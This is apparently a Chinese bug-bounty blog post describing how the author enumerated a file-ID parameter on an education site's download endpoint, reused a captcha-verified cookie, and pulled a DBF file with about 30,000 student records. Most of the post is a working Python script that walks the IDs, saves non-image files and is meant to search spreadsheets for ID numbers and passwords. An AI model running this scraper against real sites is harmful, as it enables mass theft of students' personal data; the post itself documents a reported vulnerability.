---
title: 非典型渗透 - 某EDU资产 外部敏感信息泄漏拿下 EduSRC 证书
published: false
---

# [](#header-1)0、前言

这是一次对教育资产简单的渗透，仅仅是记录一下最关键的流程，其它部分不再赘述  
由于该次渗透不是进内网拿的证书，因此有记录的必要  

# [](#header-1)1、疑似通杀

资产大扫描汇总，经过一一排查发现某处比较隐蔽的url存在可疑敏感信息泄漏点  

该url响应的是一个img文件  
```url
https://xxx.edu.cn/system/_content/download.jsp?urltype=news.DownloadAttachUrl&owner=1134009718&wbfileid=712323
```

为什么这个几乎每个edu站点都会有的通用文件储存系统，在这个edu站点下我会觉得有敏感信息泄露漏洞呢？  
因为在大批量爬虫的过程中爬到该url时返回的图片就已经包含敏感信息泄露了，有十足的把握认定该网站管理员在该文件系统中不正确地储存了敏感文件  
当然，最后结果也如我所愿  

继续观察该url不难发现，该url分为两个部分：  
参数：urltype  
和另外两个参数:owner、wbfileid  

讨论第二部分，尝试横向遍历，通过向数值减小的方向遍历wbfileid参数，发现一下规律：  
  
1、当前url响应的文件时间随数值的减小而减小  

2、jpg、png、gif等图片大多都为学生合照、活动照片，于是过滤这些资产  

3、pdf、xlsx等其他各式更为重要，并且可以通过python脚本提取文件信息，分析是否有重要内容，省去人工筛查的麻烦  

# [](#header-1)2、exp利用
第一次要求时要求验证码，第二次不再要求，很明显验证识别信息放在本地，不难发现验证信息存于cookie中，正好省去python自动校验验证码带来的时间损耗  

因此，写了个python exp自动遍历，自动保存文件在同级路径下人工审查(别问为什么不用burpsuite，因为要进行过滤操作)  

```python

import xlrd
#利用这个库分析表格文件，可以匹配身份证、密码等敏感信息
import requests
import os
import time

get_header = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    	"Cookie": [验证码校验过的Cookie String类型]
}

prev = [开始遍历的wbfileid参数 int类型]
last = [结束遍历的wbfileid参数 int类型]

URL = "https://[填写可疑系统域名]/system/_content/download.jsp?urltype=news.DownloadAttachUrl&owner=1134009718&wbfileid="

def save(filename, content, nums):
    filename2 = f'''{nums}----''' + filename
    with open(filename2,'wb') as file:
        file.write(content)

for i in range(prev, last):
    try:
        print(i)
        url = URL + str(i)
        response = None
        while True:
            try:
                response = requests.get(url = url,headers = get_header, timeout = 20)
                break
            except:
                print('error:timeout retrying')
                pass
        filename = response.headers['Content-disposition'].split('filename=')[1].split(';')[0]
        back = filename.split('.')[-1]

        print(back)
	#自动保存除jpg和png格式以外的文件
	if not filename.endswith('jpg') and not filename.endswith('JPG') and not filename.endswith('png') and not filename.endswith('PNG'):
            save(filename, response.content, i)

        time.sleep(0.1)
    except:
        print('error')
```

最后，在遍历了几个小时后，终于遍历到了一个压缩包内包含dbf文件，excel打不开，推测是数据量过大导致的  

于是用专业dbf查看器打开，果然包含近三万条学生数据，喜提中危  

![avatar](/image/2023-06-14-0.png)

本文只介绍关键内容，绕waf等操作不再赘述  
本篇文章由leeya_bug(leeyange)自创，文章属亲身经历，禁止抄袭payload  
